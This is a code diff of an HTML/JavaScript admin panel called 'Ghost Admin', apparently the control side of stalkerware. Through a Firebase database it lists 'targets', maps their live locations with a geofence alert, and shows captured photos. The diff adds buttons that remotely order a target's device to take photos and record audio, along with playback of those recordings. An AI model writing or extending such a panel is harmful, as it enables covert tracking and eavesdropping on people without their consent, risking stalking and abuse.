@@ -1,124 +1,99 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ghost Admin - Professional Tracker</title>
+    <title>Ghost Admin v2</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { display: flex; height: 100vh; margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
-        #sidebar { width: 350px; border-right: 2px solid #00ff00; display: flex; flex-direction: column; background: #111; }
-        .list-header { padding: 15px; background: #00ff00; color: #000; font-weight: bold; text-align: center; }
-        #userList { flex-grow: 1; overflow-y: auto; padding: 10px; }
-        .user-card { border: 1px solid #00ff00; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
-        .user-card:hover { background: #004400; }
-        
-        #main-view { flex-grow: 1; display: flex; flex-direction: column; position: relative; }
-        #map { height: 60%; width: 100%; border-bottom: 2px solid #00ff00; }
-        
-        #photoGallery { height: 40%; overflow-x: auto; white-space: nowrap; padding: 10px; background: #050505; }
-        .photo-box { display: inline-block; margin-right: 15px; border: 1px solid #00ff00; padding: 5px; text-align: center; }
-        .photo-box img { height: 150px; display: block; border-radius: 4px; }
-        .photo-box p { font-size: 10px; margin: 5px 0; }
-
-        .alert-active { animation: blink 0.5s infinite; background: red !important; color: white !important; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
+        body { display: flex; height: 100vh; margin: 0; background: #0a0a0a; color: #0f0; font-family: monospace; }
+        #side { width: 300px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; }
+        #main { flex-grow: 1; display: flex; flex-direction: column; }
+        #map { height: 50%; border-bottom: 1px solid #0f0; }
+        #output { height: 50%; overflow-y: auto; padding: 15px; background: #000; }
+        .target-card { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; }
+        .controls { margin-top: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
+        button { background: #0f0; color: #000; border: none; padding: 8px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #0c0; }
+        .img-box { display: inline-block; margin: 5px; border: 1px solid #555; text-align: center; }
+        .img-box img { width: 150px; display: block; }
+        .alert { background: red; color: white; padding: 5px; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div id="sidebar">
-        <div class="list-header">ONLINE TARGETS</div>
-        <div id="userList">Waiting for targets...</div>
+    <div id="side">
+        <h3>ACTIVE TARGETS</h3>
+        <div id="userList"></div>
     </div>
-
-    <div id="main-view">
+    <div id="main">
         <div id="map"></div>
-        <div id="photoGallery">
-            <div style="padding: 20px;">Target ki photos yahan nazar aayengi...</div>
+        <div id="output">
+            <h3>LIVE FEED (Select a target)</h3>
+            <div id="feedContent"></div>
         </div>
     </div>
 
     <script>
-        // --- Firebase Configuration ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-
-        // --- Map Setup ---
-        var map = L.map('map').setView([24.8607, 67.0011], 13);
+        var map = L.map('map').setView([0,0], 2);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         var markers = {};
+        var currentTarget = "";
 
-        // --- Geofence Settings ---
-        const homeLat = 24.8607; 
-        const homeLng = 67.0011; 
-        const safeRadius = 0.5; // 500 meters
+        // Geofencing Center (Karachi example - Change this)
+        const home = { lat: 24.8607, lng: 67.0011, radius: 1 }; // 1km radius
 
-        // --- Listen for Targets ---
-        db.ref('targets').on('value', snapshot => {
-            const userListDiv = document.getElementById('userList');
-            userListDiv.innerHTML = "";
-            
-            snapshot.forEach(user => {
-                const userId = user.key;
-                const data = user.val();
-                if(!data.location) return;
+        db.ref('targets').on('value', snap => {
+            const list = document.getElementById('userList');
+            list.innerHTML = "";
+            snap.forEach(user => {
+                const id = user.key;
+                const loc = user.val().location;
+                if(!loc) return;
 
-                // 1. Check Geofence
-                const dist = getDistance(homeLat, homeLng, data.location.lat, data.location.lng);
-                const isOut = dist > safeRadius;
+                // Geofence check
+                const dist = getDist(home.lat, home.lng, loc.lat, loc.lng);
+                const isOut = dist > home.radius;
 
-                // 2. Create User Card
                 const card = document.createElement('div');
-                card.className = `user-card ${isOut ? 'alert-active' : ''}`;
-                card.innerHTML = `
-                    <strong>ID: ${userId}</strong><br>
-                    Last Seen: ${data.location.timestamp}<br>
-                    Distance: ${dist.toFixed(2)} km
-                `;
-                card.onclick = () => {
-                    map.setView([data.location.lat, data.location.lng], 18);
-                    loadPhotos(userId);
-                };
-                userListDiv.appendChild(card);
+                card.className = "target-card";
+                card.innerHTML = `<b>${id}</b><br>${isOut ? '<div class="alert">OUT OF AREA</div>' : 'In Range'}<br>
+                <div class="controls">
+                    <button onclick="sendCmd('${id}', 'snap')">📸 PHOTO</button>
+                    <button onclick="sendCmd('${id}', 'mic')">🎙️ AUDIO</button>
+                </div>`;
+                card.onclick = () => { currentTarget = id; map.setView([loc.lat, loc.lng], 17); loadFeed(id); };
+                list.appendChild(card);
 
-                // 3. Update Marker
-                if (markers[userId]) {
-                    markers[userId].setLatLng([data.location.lat, data.location.lng]);
-                } else {
-                    markers[userId] = L.marker([data.location.lat, data.location.lng]).addTo(map).bindPopup(userId);
-                }
+                if(!markers[id]) markers[id] = L.marker([loc.lat, loc.lng]).addTo(map);
+                else markers[id].setLatLng([loc.lat, loc.lng]);
             });
         });
 
-        // --- Load Photos for Selected User ---
-        function loadPhotos(uid) {
-            const gallery = document.getElementById('photoGallery');
-            gallery.innerHTML = "<h4>Photos for " + uid + "</h4>";
+        function sendCmd(id, act) { db.ref('commands/' + id).set({ action: act, sec: 15 }); alert("Command Sent!"); }
+
+        function loadFeed(id) {
+            const feed = document.getElementById('feedContent');
+            feed.innerHTML = "<h4>Viewing Feed: "+id+"</h4><div id='photos'></div><div id='audios'></div>";
             
-            db.ref('targets/' + uid + '/photos').on('child_added', (snap) => {
-                const photo = snap.val();
-                const box = document.createElement('div');
-                box.className = "photo-box";
-                box.innerHTML = `
-                    <img src="${photo.image}">
-                    <p>${photo.type}<br>${photo.time}</p>
-                `;
-                gallery.prepend(box); // New photos first
+            db.ref('targets/'+id+'/photos').on('child_added', s => {
+                const p = s.val();
+                document.getElementById('photos').innerHTML += `<div class="img-box"><img src="${p.image}"><small>${p.type} @ ${p.time}</small></div>`;
+            });
+
+            db.ref('targets/'+id+'/audio').on('child_added', s => {
+                const a = s.val();
+                document.getElementById('audios').innerHTML += `<div style="margin:10px;">🔊 Audio (${a.time})<br><audio controls src="${a.data}"></audio></div>`;
             });
         }
 
-        // --- Distance Calculation (Haversine) ---
-        function getDistance(lat1, lon1, lat2, lon2) {
-            var R = 6371;
-            var dLat = (lat2-lat1) * Math.PI / 180;
-            var dLon = (lon2-lon1) * Math.PI / 180; 
-            var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-                    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2); 
-            var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)); 
-            return R * c;
+        function getDist(l1, n1, l2, n2) {
+            const R = 6371; const dL = (l2-l1)*Math.PI/180; const dN = (n2-n1)*Math.PI/180;
+            const a = Math.sin(dL/2)**2 + Math.cos(l1*Math.PI/180)*Math.cos(l2*Math.PI/180)*Math.sin(dN/2)**2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
         }
     </script>
 </body>
